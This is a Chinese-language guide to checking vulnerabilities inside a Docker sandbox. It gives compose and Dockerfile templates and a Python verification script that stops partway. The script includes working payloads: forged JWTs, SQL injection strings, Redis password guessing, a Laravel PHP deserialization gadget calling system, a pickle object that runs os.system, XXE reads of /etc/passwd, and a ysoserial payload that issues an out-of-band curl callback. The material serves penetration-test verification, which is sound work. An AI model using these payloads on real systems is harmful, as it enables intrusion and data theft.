# Docker 部署验证指南

> 版本: 1.0.0 | 更新日期: 2026-02-05

## 概述

Docker部署验证是security-review skill的高级功能，用于在隔离的沙箱环境中**动态验证**发现的漏洞。

### 核心理念 (借鉴DeepAudit)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         Docker验证核心理念                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  静态分析 (security-review)        动态验证 (docker-verification)                │
│  ┌─────────────────────┐      ┌─────────────────────────────────┐          │
│  │ Grep/Read 发现漏洞  │ ──→  │ Docker沙箱中执行POC验证         │          │
│  │ 污点追踪分析        │ ──→  │ Fuzzing Harness隔离测试         │          │
│  │ 置信度评估          │ ──→  │ 动态确认漏洞是否可利用          │          │
│  └─────────────────────┘      └─────────────────────────────────┘          │
│           │                              │                                  │
│           └──────────────┬───────────────┘                                  │
│                          ▼                                                  │
│                   完整审计报告                                               │
│                  (静态+动态验证)                                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 何时使用

| 场景 | 推荐 | 说明 |
|-----|------|------|
| 快速审计 (quick) | ❌ | 仅静态分析 |
| 标准审计 (standard) | ⚠️ | 可选 - 对高危漏洞验证 |
| 深度审计 (deep) | ✅ | 推荐 - 完整动态验证 |
| 渗透测试准备 | ✅ | 必须 - 确认可利用性 |

---

## 快速开始

### 1. 生成验证环境

审计完成后，使用以下命令生成Docker验证环境:

```bash
# 创建验证目录
mkdir -p vuln-verification/{sandbox,poc,reports}
cd vuln-verification

# 生成配置文件
security-review --generate-docker-env --project /path/to/project
```

### 2. 启动环境

```bash
docker-compose up -d
```

### 3. 执行验证

```bash
docker exec -it sandbox python /workspace/poc/verify_all.py
```

---

## Docker环境模板

### docker-compose.yml

```yaml
# security-review Docker验证环境
# 版本: 1.0.0
# 使用: docker-compose up -d

version: '3.8'

services:
  # =============================================
  # 目标应用 (根据项目类型选择)
  # =============================================

  # Java/Spring Boot应用
  target-java:
    build:
      context: ./target
      dockerfile: Dockerfile.java
    ports:
      - "8080:8080"
    environment:
      - SPRING_PROFILES_ACTIVE=dev
    networks:
      - vuln-net
    profiles:
      - java

  # Python/Flask应用
  target-python:
    build:
      context: ./target
      dockerfile: Dockerfile.python
    ports:
      - "5000:5000"
    networks:
      - vuln-net
    profiles:
      - python

  # PHP应用
  target-php:
    build:
      context: ./target
      dockerfile: Dockerfile.php
    ports:
      - "80:80"
    networks:
      - vuln-net
    profiles:
      - php

  # Node.js应用
  target-node:
    build:
      context: ./target
      dockerfile: Dockerfile.node
    ports:
      - "3000:3000"
    networks:
      - vuln-net
    profiles:
      - node

  # Go应用
  target-go:
    build:
      context: ./target
      dockerfile: Dockerfile.go
    ports:
      - "8081:8081"
    networks:
      - vuln-net
    profiles:
      - go

  # Ruby/Rails应用
  target-ruby:
    build:
      context: ./target
      dockerfile: Dockerfile.ruby
    ports:
      - "3001:3000"
    environment:
      - RAILS_ENV=development
    networks:
      - vuln-net
    profiles:
      - ruby

  # .NET/ASP.NET Core应用
  target-dotnet:
    build:
      context: ./target
      dockerfile: Dockerfile.dotnet
    ports:
      - "5001:5000"
    environment:
      - ASPNETCORE_ENVIRONMENT=Development
    networks:
      - vuln-net
    profiles:
      - dotnet

  # Rust应用
  target-rust:
    build:
      context: ./target
      dockerfile: Dockerfile.rust
    ports:
      - "8082:8080"
    networks:
      - vuln-net
    profiles:
      - rust

  # C/C++应用 (通常是CGI或独立服务)
  target-cpp:
    build:
      context: ./target
      dockerfile: Dockerfile.cpp
    ports:
      - "8083:8080"
    networks:
      - vuln-net
    profiles:
      - cpp

  # =============================================
  # 依赖服务
  # =============================================

  # MySQL数据库
  mysql:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: testdb
    volumes:
      - mysql_data:/var/lib/mysql
    networks:
      - vuln-net

  # Redis缓存
  redis:
    image: redis:7-alpine
    command: redis-server --requirepass redis123
    networks:
      - vuln-net

  # =============================================
  # 漏洞验证沙箱
  # =============================================

  sandbox:
    build:
      context: ./sandbox
      dockerfile: Dockerfile
    volumes:
      - ./poc:/workspace/poc:ro
      - ./reports:/workspace/reports:rw
      - ./target:/workspace/target:ro
    environment:
      - TARGET_HOST=target-java
      - TARGET_PORT=8080
      - MYSQL_HOST=mysql
      - REDIS_HOST=redis
    depends_on:
      - mysql
      - redis
    networks:
      - vuln-net
    tty: true
    stdin_open: true

  # =============================================
  # 辅助服务 (用于SSRF验证)
  # =============================================

  # 内网模拟服务
  internal-service:
    image: nginx:alpine
    volumes:
      - ./internal-data:/usr/share/nginx/html:ro
    networks:
      - vuln-net

  # DNS rebinding测试
  dns-rebind:
    image: taviso/rebinder
    networks:
      - vuln-net
    profiles:
      - advanced

networks:
  vuln-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.28.0.0/16

volumes:
  mysql_data:
```

### sandbox/Dockerfile

```dockerfile
# security-review 漏洞验证沙箱
# 版本: 1.0.0

FROM python:3.11-bullseye

LABEL maintainer="security-review skill"
LABEL description="Vulnerability verification sandbox for security-review"

# =============================================
# 基础工具安装
# =============================================

RUN apt-get update && apt-get install -y --no-install-recommends \
    # 网络工具
    curl wget netcat-openbsd dnsutils iputils-ping nmap \
    # 编程语言运行时
    php-cli openjdk-11-jdk-headless ruby nodejs npm \
    # 安全工具
    sqlmap nikto \
    # 实用工具
    jq vim less tree \
    && rm -rf /var/lib/apt/lists/*

# =============================================
# Go 安装 (用于Go项目验证)
# =============================================

ENV PATH=$PATH:/usr/local/go/bin
RUN curl -L https://go.dev/dl/go1.21.6.linux-amd64.tar.gz -o go.tar.gz && \
    tar -C /usr/local -xzf go.tar.gz && \
    rm go.tar.gz

# =============================================
# .NET SDK 安装 (用于.NET项目验证)
# =============================================

RUN curl -L https://dot.net/v1/dotnet-install.sh -o dotnet-install.sh && \
    chmod +x dotnet-install.sh && \
    ./dotnet-install.sh --channel 8.0 --install-dir /usr/local/dotnet && \
    rm dotnet-install.sh
ENV PATH=$PATH:/usr/local/dotnet
ENV DOTNET_ROOT=/usr/local/dotnet

# =============================================
# Rust 安装 (用于Rust项目验证)
# =============================================

ENV RUSTUP_HOME=/usr/local/rustup
ENV CARGO_HOME=/usr/local/cargo
ENV PATH=$PATH:/usr/local/cargo/bin
RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain stable --no-modify-path

# =============================================
# C/C++ 编译工具 (用于C/C++项目验证)
# =============================================

RUN apt-get update && apt-get install -y --no-install-recommends \
    gcc g++ make cmake gdb valgrind \
    libasan6 libubsan1 \
    && rm -rf /var/lib/apt/lists/*

# =============================================
# Python 安全库
# =============================================

RUN pip install --no-cache-dir \
    # HTTP客户端
    requests httpx aiohttp \
    # 安全测试
    pycryptodome paramiko pyjwt python-jose \
    # 数据库客户端
    pymysql redis pymongo \
    # 解析工具
    beautifulsoup4 lxml pyyaml \
    # 其他
    colorama tabulate

# =============================================
# 安全测试工具
# =============================================

# Semgrep
RUN pip install semgrep

# Nuclei
RUN curl -L https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_linux_amd64.zip -o nuclei.zip && \
    unzip nuclei.zip -d /usr/local/bin/ && \
    rm nuclei.zip

# =============================================
# 工作目录设置
# =============================================

WORKDIR /workspace

# 创建非root用户
RUN groupadd -g 1000 auditor && \
    useradd -u 1000 -g auditor -m -s /bin/bash auditor && \
    chown -R auditor:auditor /workspace

USER auditor

# 环境变量
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1

CMD ["/bin/bash"]
```

---

## 语言特定Dockerfile模板

### Dockerfile.java (Spring Boot)

```dockerfile
FROM eclipse-temurin:21-jdk-jammy

WORKDIR /app

# Maven构建
COPY pom.xml .
COPY src ./src
RUN apt-get update && apt-get install -y maven && \
    mvn package -DskipTests && \
    mv target/*.jar app.jar

EXPOSE 8080
CMD ["java", "-jar", "app.jar"]
```

### Dockerfile.python (Flask/Django)

```dockerfile
FROM python:3.11-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

EXPOSE 5000
CMD ["python", "app.py"]
```

### Dockerfile.php (Laravel/原生PHP)

```dockerfile
FROM php:8.2-apache

# 安装扩展
RUN docker-php-ext-install pdo pdo_mysql mysqli && \
    a2enmod rewrite

WORKDIR /var/www/html
COPY . .

# Composer依赖
RUN curl -sS https://getcomposer.org/installer | php && \
    php composer.phar install --no-dev

EXPOSE 80
```

### Dockerfile.node (Express/Koa)

```dockerfile
FROM node:20-slim

WORKDIR /app

COPY package*.json ./
RUN npm ci --only=production

COPY . .

EXPOSE 3000
CMD ["node", "app.js"]
```

### Dockerfile.go (Gin/Echo/Fiber)

```dockerfile
FROM golang:1.21-alpine AS builder

WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download

COPY . .
RUN CGO_ENABLED=0 go build -o main .

FROM alpine:latest
WORKDIR /app
COPY --from=builder /app/main .

EXPOSE 8081
CMD ["./main"]
```

### Dockerfile.ruby (Rails/Sinatra)

```dockerfile
FROM ruby:3.2-slim

RUN apt-get update && apt-get install -y \
    build-essential libpq-dev nodejs npm && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY Gemfile Gemfile.lock ./
RUN bundle install

COPY . .

EXPOSE 3000
CMD ["rails", "server", "-b", "0.0.0.0"]
```

### Dockerfile.dotnet (ASP.NET Core)

```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build

WORKDIR /src
COPY *.csproj ./
RUN dotnet restore

COPY . .
RUN dotnet publish -c Release -o /app/publish

FROM mcr.microsoft.com/dotnet/aspnet:8.0
WORKDIR /app
COPY --from=build /app/publish .

EXPOSE 5000
ENV ASPNETCORE_URLS=http://+:5000
CMD ["dotnet", "App.dll"]
```

### Dockerfile.rust (Actix/Axum)

```dockerfile
FROM rust:1.75 AS builder

WORKDIR /app
COPY Cargo.toml Cargo.lock ./
COPY src ./src
RUN cargo build --release

FROM debian:bookworm-slim
RUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY --from=builder /app/target/release/app .

EXPOSE 8080
CMD ["./app"]
```

### Dockerfile.cpp (CGI/独立服务)

```dockerfile
FROM gcc:13

WORKDIR /app

COPY . .
RUN make clean && make

EXPOSE 8080
CMD ["./server"]
```

---

## 验证脚本模板

### verify_all.py

```python
#!/usr/bin/env python3
"""
security-review 漏洞自动化验证脚本
版本: 1.0.0

使用方法:
    docker exec -it sandbox python /workspace/poc/verify_all.py
"""

import os
import sys
import json
import time
import requests
import traceback
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, asdict, field
from datetime import datetime
from enum import Enum
from abc import ABC, abstractmethod

# =============================================
# 配置
# =============================================

TARGET_HOST = os.getenv("TARGET_HOST", "target-java")
TARGET_PORT = int(os.getenv("TARGET_PORT", "8080"))
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

MYSQL_HOST = os.getenv("MYSQL_HOST", "mysql")
REDIS_HOST = os.getenv("REDIS_HOST", "redis")


# =============================================
# 数据模型
# =============================================

class Severity(Enum):
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Info"


class Verdict(Enum):
    CONFIRMED = "confirmed"      # 漏洞确认存在
    LIKELY = "likely"            # 高度可能存在
    UNCERTAIN = "uncertain"      # 需要更多信息
    FALSE_POSITIVE = "false_positive"  # 确认误报


@dataclass
class VerificationResult:
    """验证结果"""
    vuln_id: str
    title: str
    severity: Severity
    verdict: Verdict
    confidence: float  # 0.0 - 1.0
    evidence: str
    poc: str
    recommendation: str
    details: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict:
        d = asdict(self)
        d['severity'] = self.severity.value
        d['verdict'] = self.verdict.value
        return d


# =============================================
# 基础验证器
# =============================================

class BaseVerifier(ABC):
    """验证器基类"""

    def __init__(self):
        self.results: List[VerificationResult] = []

    @abstractmethod
    def verify(self) -> VerificationResult:
        """执行验证"""
        pass

    def _make_request(
        self,
        method: str,
        url: str,
        headers: Optional[Dict] = None,
        data: Optional[Any] = None,
        timeout: int = 10
    ) -> Optional[requests.Response]:
        """发送HTTP请求"""
        try:
            resp = requests.request(
                method=method,
                url=url,
                headers=headers,
                json=data if isinstance(data, dict) else None,
                data=data if isinstance(data, str) else None,
                timeout=timeout,
                allow_redirects=False
            )
            return resp
        except Exception as e:
            print(f"    [-] 请求失败: {e}")
            return None


# =============================================
# 漏洞验证器实现
# =============================================

class HardcodedSecretVerifier(BaseVerifier):
    """硬编码密钥验证器"""

    def __init__(self, key: bytes, iv: bytes, test_data: str = "test_secret"):
        super().__init__()
        self.key = key
        self.iv = iv
        self.test_data = test_data

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: 硬编码密钥...")

        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad, unpad
            import base64

            # 测试加密
            cipher1 = AES.new(self.key, AES.MODE_CBC, self.iv)
            encrypted = cipher1.encrypt(pad(self.test_data.encode(), AES.block_size))
            encrypted_b64 = base64.b64encode(encrypted).decode()

            # 测试解密
            cipher2 = AES.new(self.key, AES.MODE_CBC, self.iv)
            decrypted = unpad(cipher2.decrypt(encrypted), AES.block_size).decode()

            is_valid = decrypted == self.test_data

            return VerificationResult(
                vuln_id="CRYPTO-001",
                title="硬编码加密密钥",
                severity=Severity.CRITICAL,
                verdict=Verdict.CONFIRMED if is_valid else Verdict.FALSE_POSITIVE,
                confidence=1.0 if is_valid else 0.0,
                evidence=f"成功使用硬编码密钥加解密: {self.test_data} -> {encrypted_b64[:20]}... -> {decrypted}",
                poc=f"AES.new(b'{self.key.decode()}', AES.MODE_CBC, b'{self.iv.decode()}')",
                recommendation="使用环境变量或密钥管理服务存储密钥"
            )
        except Exception as e:
            return VerificationResult(
                vuln_id="CRYPTO-001",
                title="硬编码加密密钥",
                severity=Severity.CRITICAL,
                verdict=Verdict.UNCERTAIN,
                confidence=0.3,
                evidence=f"验证出错: {e}",
                poc="",
                recommendation="需要手动验证"
            )


class JWTBypassVerifier(BaseVerifier):
    """JWT签名绕过验证器"""

    def __init__(self, target_url: str, api_endpoint: str = "/api/user/info"):
        super().__init__()
        self.target_url = target_url
        self.api_endpoint = api_endpoint

    def _forge_token(self, uid: int = 1, oid: int = 1) -> str:
        """伪造JWT令牌"""
        import jwt
        payload = {
            "uid": uid,
            "oid": oid,
            "exp": int(time.time()) + 86400 * 365,
            "iat": int(time.time())
        }
        return jwt.encode(payload, "fake_key", algorithm="HS256")

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: JWT签名绕过...")

        try:
            # 伪造令牌
            fake_token = self._forge_token(uid=1, oid=1)
            headers = {
                "X-DE-TOKEN": fake_token,
                "Authorization": f"Bearer {fake_token}",
                "Content-Type": "application/json"
            }

            # 尝试访问受保护接口
            resp = self._make_request("GET", f"{self.target_url}{self.api_endpoint}", headers=headers)

            if resp and resp.status_code == 200:
                return VerificationResult(
                    vuln_id="AUTH-001",
                    title="JWT签名验证缺失",
                    severity=Severity.CRITICAL,
                    verdict=Verdict.CONFIRMED,
                    confidence=1.0,
                    evidence=f"伪造令牌成功访问API: {resp.text[:100]}",
                    poc=f"curl -H 'Authorization: Bearer {fake_token[:50]}...' {self.target_url}{self.api_endpoint}",
                    recommendation="使用JWTVerifier.verify()验证签名"
                )
            else:
                status = resp.status_code if resp else "无响应"
                return VerificationResult(
                    vuln_id="AUTH-001",
                    title="JWT签名验证缺失",
                    severity=Severity.CRITICAL,
                    verdict=Verdict.FALSE_POSITIVE,
                    confidence=0.8,
                    evidence=f"伪造令牌被拒绝: {status}",
                    poc="",
                    recommendation="已修复或需要其他认证方式"
                )
        except Exception as e:
            return VerificationResult(
                vuln_id="AUTH-001",
                title="JWT签名验证缺失",
                severity=Severity.CRITICAL,
                verdict=Verdict.UNCERTAIN,
                confidence=0.3,
                evidence=f"验证出错: {e}",
                poc="",
                recommendation="需要手动验证"
            )


class SSRFVerifier(BaseVerifier):
    """SSRF漏洞验证器"""

    def __init__(self, target_url: str, ssrf_endpoint: str, internal_target: str = "http://internal-service/"):
        super().__init__()
        self.target_url = target_url
        self.ssrf_endpoint = ssrf_endpoint
        self.internal_target = internal_target

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: SSRF漏洞...")

        try:
            import base64

            # 构造SSRF payload
            payload = {
                "url": self.internal_target,
                "userName": base64.b64encode(b"").decode(),
                "passwd": base64.b64encode(b"").decode()
            }

            headers = {"Content-Type": "application/json"}
            resp = self._make_request("POST", f"{self.target_url}{self.ssrf_endpoint}", headers=headers, data=payload)

            if resp:
                # 检查是否成功访问内网
                is_vulnerable = (
                    resp.status_code == 200 or
                    "nginx" in resp.text.lower() or
                    "internal" in resp.text.lower()
                )

                if is_vulnerable:
                    return VerificationResult(
                        vuln_id="SSRF-001",
                        title="SSRF - 服务端请求伪造",
                        severity=Severity.HIGH,
                        verdict=Verdict.CONFIRMED,
                        confidence=0.9,
                        evidence=f"成功访问内网服务: {resp.text[:100]}",
                        poc=f"POST {self.ssrf_endpoint} {{\"url\": \"{self.internal_target}\"}}",
                        recommendation="添加URL白名单验证，禁止内网IP"
                    )

            return VerificationResult(
                vuln_id="SSRF-001",
                title="SSRF - 服务端请求伪造",
                severity=Severity.HIGH,
                verdict=Verdict.FALSE_POSITIVE,
                confidence=0.6,
                evidence="请求被拒绝或过滤",
                poc="",
                recommendation="可能已添加过滤"
            )
        except Exception as e:
            return VerificationResult(
                vuln_id="SSRF-001",
                title="SSRF - 服务端请求伪造",
                severity=Severity.HIGH,
                verdict=Verdict.UNCERTAIN,
                confidence=0.3,
                evidence=f"验证出错: {e}",
                poc="",
                recommendation="需要手动验证"
            )


class SQLInjectionVerifier(BaseVerifier):
    """SQL注入验证器"""

    def __init__(self, target_url: str, endpoint: str, param: str):
        super().__init__()
        self.target_url = target_url
        self.endpoint = endpoint
        self.param = param

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: SQL注入...")

        payloads = [
            ("'", ["SQL syntax", "mysql", "ORA-", "syntax error"]),
            ("1' OR '1'='1", ["true", "1", "admin"]),
            ("1; SELECT SLEEP(3)--", []),  # 时间盲注
            ("1 UNION SELECT NULL,NULL--", ["null", "column"]),
        ]

        for payload, indicators in payloads:
            try:
                url = f"{self.target_url}{self.endpoint}?{self.param}={payload}"
                start_time = time.time()
                resp = self._make_request("GET", url, timeout=15)
                elapsed = time.time() - start_time

                if resp:
                    # 检查错误信息
                    for indicator in indicators:
                        if indicator.lower() in resp.text.lower():
                            return VerificationResult(
                                vuln_id="SQLI-001",
                                title="SQL注入",
                                severity=Severity.CRITICAL,
                                verdict=Verdict.CONFIRMED,
                                confidence=0.95,
                                evidence=f"SQL错误特征 '{indicator}' 出现在响应中",
                                poc=f"curl '{url}'",
                                recommendation="使用参数化查询或ORM"
                            )

                    # 检查时间盲注
                    if "SLEEP" in payload and elapsed > 2.5:
                        return VerificationResult(
                            vuln_id="SQLI-001",
                            title="SQL注入 (时间盲注)",
                            severity=Severity.CRITICAL,
                            verdict=Verdict.CONFIRMED,
                            confidence=0.85,
                            evidence=f"SLEEP注入导致延迟 {elapsed:.2f}s",
                            poc=f"curl '{url}'",
                            recommendation="使用参数化查询或ORM"
                        )
            except:
                continue

        return VerificationResult(
            vuln_id="SQLI-001",
            title="SQL注入",
            severity=Severity.CRITICAL,
            verdict=Verdict.FALSE_POSITIVE,
            confidence=0.7,
            evidence="未检测到SQL注入特征",
            poc="",
            recommendation="可能已修复或需要更多payload测试"
        )


class RedisWeakPasswordVerifier(BaseVerifier):
    """Redis弱密码验证器"""

    def __init__(self, host: str = "redis", port: int = 6379):
        super().__init__()
        self.host = host
        self.port = port

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: Redis弱密码...")

        import redis

        weak_passwords = ["", "123456", "redis", "password", "admin", "root"]

        for pwd in weak_passwords:
            try:
                r = redis.Redis(
                    host=self.host,
                    port=self.port,
                    password=pwd if pwd else None,
                    socket_timeout=3
                )
                r.ping()
                keys_count = len(r.keys("*"))

                return VerificationResult(
                    vuln_id="CONFIG-001",
                    title="Redis弱密码",
                    severity=Severity.CRITICAL,
                    verdict=Verdict.CONFIRMED,
                    confidence=1.0,
                    evidence=f"成功使用密码'{pwd}'连接Redis，发现{keys_count}个key",
                    poc=f"redis-cli -h {self.host} -p {self.port} -a '{pwd}' KEYS '*'",
                    recommendation="使用强密码，限制访问IP"
                )
            except redis.AuthenticationError:
                continue
            except redis.ConnectionError:
                break
            except Exception:
                continue

        return VerificationResult(
            vuln_id="CONFIG-001",
            title="Redis弱密码",
            severity=Severity.CRITICAL,
            verdict=Verdict.FALSE_POSITIVE,
            confidence=0.8,
            evidence="无法使用弱密码连接",
            poc="",
            recommendation="已配置强密码或不可达"
        )


# =============================================
# 语言特定验证器
# =============================================

class JavaDeserializationVerifier(BaseVerifier):
    """Java反序列化漏洞验证器"""

    def __init__(self, target_url: str, endpoint: str, gadget: str = "CommonsCollections6"):
        super().__init__()
        self.target_url = target_url
        self.endpoint = endpoint
        self.gadget = gadget

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: Java反序列化...")

        try:
            import subprocess
            import base64

            # 使用ysoserial生成payload (需要预装)
            # 这里使用DNS回调检测
            callback_domain = f"deser-{int(time.time())}.oast.fun"

            # 生成payload
            result = subprocess.run(
                ["java", "-jar", "/workspace/tools/ysoserial.jar", self.gadget, f"curl {callback_domain}"],
                capture_output=True,
                timeout=30
            )

            if result.returncode == 0:
                payload = base64.b64encode(result.stdout).decode()

                # 发送payload
                headers = {"Content-Type": "application/x-java-serialized-object"}
                resp = self._make_request(
                    "POST",
                    f"{self.target_url}{self.endpoint}",
                    headers=headers,
                    data=result.stdout
                )

                # 检查OAST回调或错误信息
                if resp:
                    error_indicators = ["ClassNotFoundException", "InvalidClassException", "java.io"]
                    for indicator in error_indicators:
                        if indicator in resp.text:
                            return VerificationResult(
                                vuln_id="DESER-JAVA-001",
                                title="Java反序列化漏洞",
                                severity=Severity.CRITICAL,
                                verdict=Verdict.LIKELY,
                                confidence=0.7,
                                evidence=f"检测到Java序列化错误: {indicator}",
                                poc=f"ysoserial {self.gadget} 'command' | base64 | curl -d @- {self.endpoint}",
                                recommendation="禁用ObjectInputStream或使用白名单"
                            )

            return VerificationResult(
                vuln_id="DESER-JAVA-001",
                title="Java反序列化漏洞",
                severity=Severity.CRITICAL,
                verdict=Verdict.UNCERTAIN,
                confidence=0.3,
                evidence="无法生成或验证payload",
                poc="",
                recommendation="需要手动验证"
            )
        except Exception as e:
            return VerificationResult(
                vuln_id="DESER-JAVA-001",
                title="Java反序列化漏洞",
                severity=Severity.CRITICAL,
                verdict=Verdict.UNCERTAIN,
                confidence=0.2,
                evidence=f"验证出错: {e}",
                poc="",
                recommendation="需要手动验证"
            )


class PHPDeserializationVerifier(BaseVerifier):
    """PHP反序列化漏洞验证器"""

    def __init__(self, target_url: str, endpoint: str, param: str = "data"):
        super().__init__()
        self.target_url = target_url
        self.endpoint = endpoint
        self.param = param

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: PHP反序列化...")

        try:
            # PHP反序列化payload示例
            payloads = [
                # 基础对象注入检测
                'O:8:"stdClass":0:{}',
                # 常见Gadget Chain (Laravel)
                'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"\\x00*\\x00events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"\\x00*\\x00listeners";a:1:{s:4:"test";a:1:{i:0;s:6:"system";}}}}',
                # Phar反序列化检测
                'phar:///tmp/test.phar/test.txt',
            ]

            for payload in payloads:
                resp = self._make_request(
                    "POST",
                    f"{self.target_url}{self.endpoint}",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    data=f"{self.param}={requests.utils.quote(payload)}"
                )

                if resp:
                    # 检查错误信息
                    error_indicators = [
                        "unserialize()",
                        "__wakeup",
                        "__destruct",
                        "Allowed memory size",
                        "Class .* not found"
                    ]
                    import re
                    for indicator in error_indicators:
                        if re.search(indicator, resp.text, re.IGNORECASE):
                            return VerificationResult(
                                vuln_id="DESER-PHP-001",
                                title="PHP反序列化漏洞",
                                severity=Severity.CRITICAL,
                                verdict=Verdict.LIKELY,
                                confidence=0.75,
                                evidence=f"检测到PHP反序列化特征: {indicator}",
                                poc=f"curl -d '{self.param}=O:8:\"stdClass\":0:{{}}' {self.endpoint}",
                                recommendation="使用json_decode替代unserialize，或添加类白名单"
                            )

            return VerificationResult(
                vuln_id="DESER-PHP-001",
                title="PHP反序列化漏洞",
                severity=Severity.CRITICAL,
                verdict=Verdict.FALSE_POSITIVE,
                confidence=0.6,
                evidence="未检测到反序列化特征",
                poc="",
                recommendation="可能已修复或不存在"
            )
        except Exception as e:
            return VerificationResult(
                vuln_id="DESER-PHP-001",
                title="PHP反序列化漏洞",
                severity=Severity.CRITICAL,
                verdict=Verdict.UNCERTAIN,
                confidence=0.2,
                evidence=f"验证出错: {e}",
                poc="",
                recommendation="需要手动验证"
            )


class PythonPickleVerifier(BaseVerifier):
    """Python Pickle反序列化验证器"""

    def __init__(self, target_url: str, endpoint: str, param: str = "data"):
        super().__init__()
        self.target_url = target_url
        self.endpoint = endpoint
        self.param = param

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: Python Pickle反序列化...")

        try:
            import pickle
            import base64

            # 构造检测payload (无害的DNS回调)
            class PickleRCE:
                def __reduce__(self):
                    import os
                    return (os.system, ('echo PICKLE_VULN_DETECTED',))

            payload = base64.b64encode(pickle.dumps(PickleRCE())).decode()

            resp = self._make_request(
                "POST",
                f"{self.target_url}{self.endpoint}",
                headers={"Content-Type": "application/json"},
                data={"data": payload}
            )

            if resp:
                # 检查是否执行成功或报错
                if "PICKLE_VULN_DETECTED" in resp.text:
                    return VerificationResult(
                        vuln_id="DESER-PY-001",
                        title="Python Pickle反序列化RCE",
                        severity=Severity.CRITICAL,
                        verdict=Verdict.CONFIRMED,
                        confidence=1.0,
                        evidence="Pickle payload执行成功",
                        poc=f"import pickle; pickle.loads(base64.b64decode('{payload[:50]}...'))",
                        recommendation="使用json代替pickle，或使用hmac验证数据完整性"
                    )

                error_indicators = ["pickle", "unpickle", "_pickle", "cPickle"]
                for indicator in error_indicators:
                    if indicator.lower() in resp.text.lower():
                        return VerificationResult(
                            vuln_id="DESER-PY-001",
                            title="Python Pickle反序列化",
                            severity=Severity.CRITICAL,
                            verdict=Verdict.LIKELY,
                            confidence=0.7,
                            evidence=f"检测到Pickle相关错误: {indicator}",
                            poc="",
                            recommendation="使用json代替pickle"
                        )

            return VerificationResult(
                vuln_id="DESER-PY-001",
                title="Python Pickle反序列化",
                severity=Severity.CRITICAL,
                verdict=Verdict.FALSE_POSITIVE,
                confidence=0.6,
                evidence="未检测到Pickle特征",
                poc="",
                recommendation="可能已修复"
            )
        except Exception as e:
            return VerificationResult(
                vuln_id="DESER-PY-001",
                title="Python Pickle反序列化",
                severity=Severity.CRITICAL,
                verdict=Verdict.UNCERTAIN,
                confidence=0.2,
                evidence=f"验证出错: {e}",
                poc="",
                recommendation="需要手动验证"
            )


class XXEVerifier(BaseVerifier):
    """XXE漏洞验证器 (通用)"""

    def __init__(self, target_url: str, endpoint: str):
        super().__init__()
        self.target_url = target_url
        self.endpoint = endpoint

    def verify(self) -> VerificationResult:
        print("\n[*] 验证: XXE漏洞...")

        try:
            # XXE Payload列表
            payloads = [
                # 基础文件读取
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',

                # Windows路径
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>''',

                # 参数实体 (绕过某些过滤)
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root>test</root>''',

                # SSRF via XXE
                '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service/">]>
<root>&xxe;</root>''',
            ]

            headers = {"Content-Type": "application/xml"}

            for payload in payloads:
                resp = self._make_request(
                    "POST",
                    f"{self.target_url}{self.endpoint}",
                    headers=headers,
                    data=payload
                )

                if resp:
                    # 检查文件内容泄露
                    file_indicators = ["root:", "daemon:", "[fonts]", "[extensions]"]
                    for indicator in file_indicators:
                        if indicator in resp.text:
                            return VerificationResult(
                                vuln_id="XXE-001",
                                title="XXE - XML外部实体注入",
                                severity=Severity.HIGH,
                                verdict=Verdict.CONFIRMED,
                                confidence=0.95,
                                evidence=f"成功读取系统文件，发现: {indicator}",
                                poc=payload[:100] + "...",
                                recommendation="禁用外部实体: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)"
                            )

                    # 检查XML解析错误
                    error_indicators = ["DOCTYPE", "ENTITY", "parser error", "XMLSyntaxError"]
                    for indicator in error_indicators:
                        if indicator in resp.text:
                            return VerificationResult(
                                vuln_id="XXE-001",
                                title="XXE - XML外部实体注入",
                                severity=Severity.HIGH,
                                verdict=Verdict.LIKELY,
                                confidence=0.6,
                                evidence=f"XML解析器响应实体定义: {indicator}",
                                poc="",
                                recommendation="需要进一步验证"
                            )

            return VerificationResult(
                vuln_id="XXE-001",
                title="XXE - XML外部实体注入",
                severity=Severity.HIGH,
                verdict=Verdict.FALSE_POSITIVE,
                confidence=0.7,
                evidence="XML解析器可能已禁用外部实体",
                poc="",
                recommendation="已安全配置"
            )
        except Exception as e:
            return VerificationResult(
                vuln_id="XXE-001",
                title="XXE - XML外部实体注入",
                severity=Severity.HIGH,
